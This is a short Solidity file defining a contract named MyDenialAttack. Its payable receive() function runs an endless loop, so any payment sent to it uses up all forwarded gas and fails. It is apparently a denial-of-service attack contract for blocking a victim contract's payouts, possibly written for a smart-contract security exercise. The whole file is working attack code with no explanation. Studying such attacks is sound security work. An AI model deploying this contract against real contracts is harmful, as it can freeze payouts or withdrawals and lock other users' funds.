// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IPayable {
    receive() external payable;
}

contract MyDenialAttack is IPayable {
    receive() external payable override {
        for (;;) {}
    }
}
